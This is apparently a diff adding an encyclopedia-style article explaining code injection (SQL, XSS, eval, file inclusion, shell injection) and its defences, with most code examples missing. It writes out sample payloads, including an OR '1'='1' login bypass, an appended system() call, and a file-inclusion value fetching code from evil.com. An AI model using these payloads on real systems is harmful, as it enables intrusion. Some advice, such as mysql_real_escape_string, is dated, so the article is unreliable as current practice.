@@ -1,0 +1,94 @@
+Code injection is the exploitation of a computer bug that is caused by processing invalid data. Injection is used by an attacker to introduce (or "inject") code into a vulnerable computer program and change the course of execution. The result of successful code injection is often disastrous (for instance: code injection is used by some computer worms to propagate).
+Injection flaws occur when an application sends untrusted data to an interpreter. Injection flaws are very prevalent, particularly in legacy code. They are often found in SQL, LDAP, Xpath, or NoSQL queries; OS commands; XML parsers, SMTP Headers, program arguments, etc. Injection flaws are easy to discover when examining code, but frequently hard to discover via testing. Scanners and fuzzers can help attackers find injection flaws.
+Injection can result in data loss or corruption, lack of accountability, or denial of access. Injection can sometimes lead to complete host takeover.
+Certain types of code injection are errors in interpretation, giving special meaning to mere user input. Similar interpretation errors exist outside the world of computer science such as the comedy routine Who's on First?. In the routine, there is a failure to distinguish proper names from regular words. Likewise, in some types of code injection, there is a failure to distinguish user input from system commands.
+Code injection techniques are popular in system hacking or cracking to gain information, privilege escalation or unauthorized access to a system. Code injection can be used malevolently for many purposes, including:
+Arbitrarily modify values in a database through a type of code injection called SQL injection. The impact of this can range from website defacement to serious compromise of sensitive data.
+Install malware or execute malevolent code on a server, by injecting server scripting code (such as PHP or ASP).
+Privilege escalation to root permissions by exploiting Shell Injection vulnerabilities in a setuid root binary on UNIX, or Local System by exploiting a service on Windows.
+Attacking web users with HTML/Script Injection (Cross-site scripting).
+
+
+
+Some people may use code injections with good intentions. For example, changing or tweaking the behavior of a program or system through code injection can "trick" the system into behaving in a certain way without any malicious intent. Code injection could, for example,:
+Introduce a useful new column that did not appear in the original design of a search results page.
+Offer a new way to filter, order, or group data by using a field not exposed in the default functions of the original design.
+As with programs like Dropbox, add special parts that could be used to connect to online resources in an offline program.
+Some users may unsuspectingly perform code injection because input they provide to a program was not considered by those who originally developed the system. For example:
+What the user may consider a valid input may contain token characters or character strings that have been reserved by the developer to have special meaning (perhaps the "&" in "Shannon & Jason", or quotation marks as in "Bub 'Slugger' McCracken").
+The user may submit a malformed file as input that is handled gracefully in one application, but is toxic to the receiving system.
+
+
+
+To prevent code injection problems, utilize secure input and output handling, such as:
+Using API which if used properly are secure against all input characters. Parameterized queries (also known as "Compiled queries", "prepared statements", "bound variables") allows for moving user data out of string to be interpreted. Additionally Criteria API and similar API's move away from the concept of command strings to be created and interpreted.
+Enforcing language separation via a static type system.
+Input validation, such as Whitelisting only accepting known good values
+Input encoding, e.g. escaping dangerous characters. For instance, in PHP, using the htmlspecialchars() function (converts HTML tags to their ISO-8859-1 equivalents) and/or strip_tags() function (completely removes HTML tags) for safe output of text in HTML, and mysql_real_escape_string() to isolate data which will be included in an SQL request, to protect against SQL Injection.
+Output encoding, i.e. preventing HTML Injection (XSS) attacks against web site visitors
+Modular shell disassociation from kernel
+The solutions listed above deal primarily with web-based injection of HTML or script code into a server-side application. Other approaches must be taken, however, when dealing with injection of user code on the user machine, resulting in privilege elevation attacks. Some approaches that are used to detect and isolate managed and unmanaged code injections are:
+Runtime image hash validation - capture a hash of a part or complete image of the executable loaded into memory, and compare it with stored and expected hash.
+NX bit - all user data is stored in a special memory sections that are marked as non-executable. The processor is made aware that no code exists in that part of memory, and refuses to execute anything found in there.
+
+
+
+
+
+
+
+SQL injection takes advantage of the syntax of SQL to inject commands that can read or modify a database, or compromise the meaning of the original query.
+For example, consider a web page that has two fields to allow users to enter a user name and a password. The code behind the page will generate a SQL query to check the password against the list of user names:
+
+If this query returns any rows, then access is granted. However, if the malicious user enters a valid Username and injects some valid code ("password' OR '1'='1") in the Password field, then the resulting query will look like this:
+
+In the example above, "Password" is assumed to be blank or some innocuous string. "'1'='1'" will always be true and many rows will be returned, thereby allowing access.
+The technique may be refined to allow multiple statements to run, or even to load up and run external programs.
+
+
+
+
+A web server has a guestbook script, which accepts small messages from users, and typically receives messages such as
+
+ Very nice site!
+
+However a malicious person may know of a code injection vulnerability in the guestbook, and enters a message such as
+
+If another user views the page then the injected code will be executed. This code can allow the attacker to impersonate another user. However this same software bug can be accidentally triggered by an unassuming user which will cause the website to display bad HTML code.
+
+ That post was awesome, >:)
+
+HTML/Script injection is a popular subject, commonly termed "Cross-Site Scripting", or "XSS". XSS refers to an injection flaw whereby user input to a web script or something along such lines is placed into the output HTML, without being checked for HTML code or scripting.
+Many of these problems are related to erroneous assumptions of what input data is possible, or the effects of special data.
+
+
+
+Steven M. Christey of Mitre Corporation suggests this name for a class of code injection vulnerabilities.
+An eval injection vulnerability occurs when an attacker can control all or part of an input string that is fed into an eval() function call.
+
+The argument of "eval" will be processed as PHP, so additional commands can be appended. For example, if "arg" is set to "10; system('/bin/echo uh-oh')", additional code is run which executes a program on the server, in this case "/bin/echo".
+
+
+
+PHP allows serialization and deserialization of whole objects. If untrusted input is allowed into the deserialization function, it is possible to overwrite existing classes in the program and execute malicious attacks. Such attack on Joomla was found in 2013.
+
+
+
+
+Consider this PHP program (which includes a file specified by request):
+
+The example might be read as only color-files like blue.php and red.php could be loaded, while attackers might provide COLOR=http://evil.com/exploit causing PHP to load the external file.
+
+
+
+Shell injection (or Command Injection)is named after Unix shells, but applies to most systems which allow software to programmatically execute a command line. Typical shell injection-related functions include system(), StartProcess(), and System.Diagnostics.Process.Start().
+Consider the following short PHP program, which runs an external program called funnytext to replace a word the user sent with some other word.
+
+This program can be injected in several ways by exploiting the syntax of various shell features (this list is not exhaustive):
+Some languages offer functions to properly escape or quote strings that are being used to construct shell commands:
+PHP: escapeshellarg() and escapeshellcmd()
+Python: shlex.quote()
+However, this still puts the burden on the programmer to know/learn about these functions and remember to make use of them every time they use shell commands. In addition to using these functions, validating or sanitizing the user input is also recommended.
+A safer alternative is to use APIs that execute external programs directly, rather than through a shell, thus preventing the possibility of shell injection. However, these APIs tend to not support various convenience features of shells, and/or to be more cumbersome/verbose compared to concise shell syntax.
+
+
